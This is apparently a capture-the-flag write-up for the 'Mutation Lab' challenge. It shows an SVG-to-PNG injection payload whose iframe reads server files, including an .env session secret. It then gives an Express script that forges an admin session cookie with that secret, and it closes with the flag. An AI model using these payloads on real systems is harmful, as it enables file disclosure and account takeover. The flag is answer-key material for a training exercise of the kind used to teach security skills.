# Mutation Lab

```
One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, the mutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick's mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick's virtual lab. Can you help him uncover the experimentations of the wicked scientist?
```

The main feature seems to be exporting a svg to a png, we see this from the body of a POST request to /api/export

```json
{
  "svg":"<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"400\" height=\"400\" viewBox=\"0,0,400,400\"><g fill=\"none\" fill-rule=\"nonzero\" stroke=\"none\" stroke-width=\"none\" stroke-linecap=\"none\" stroke-linejoin=\"miter\" stroke-miterlimit=\"10\" stroke-dasharray=\"\" stroke-dashoffset=\"0\" font-family=\"none\" font-weight=\"none\" font-size=\"none\" text-anchor=\"none\" style=\"mix-blend-mode: normal\"><path d=\"M200.50969,360c-5.27079,-20....... etc"
}
```

I know from the server header `X-Powered-By: Express` it is running on node, so I searched for libraries that do svg to png conversion with vulnerabilities, and I found this

https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244

I found a poc payload

```json
{
    "svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/routes/index.js\" width=\"100%\" height=\"3000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"3000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
}
```

this leaks the file in the produced png. Using the file structure from previous challenges I guessed at the source code paths, finding:

file leaks
```js
/app/routes/index.js
/app/database.js
/app/index.js
/app/.env
```

last one gives session secret

SESSION_SECRET_KEY=5921719c3037662e94250307ec5ed1db


we can now forge a session and valid signature using the secret. Run this locally to generate the cookie.

```js
var cookieSession = require('cookie-session')
var express = require('express')

var app = express()

app.use(cookieSession({
  name: 'session',
  keys: ['5921719c3037662e94250307ec5ed1db']
}))

app.get('/', function (req, res, next) {
  // Update views
  req.session.username = 'admin'

  // Write response
  res.send('Hello World');
})


var server = app.listen(8081, function () {
  var host = server.address().address
  var port = server.address().port
  
  console.log("Example app listening at http://%s:%s", host, port)
})
```


go to localhost:8081/

copy the cookies and paste them into the devtools for mutation lab

now you have a valid session for admin and can see the flag

HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}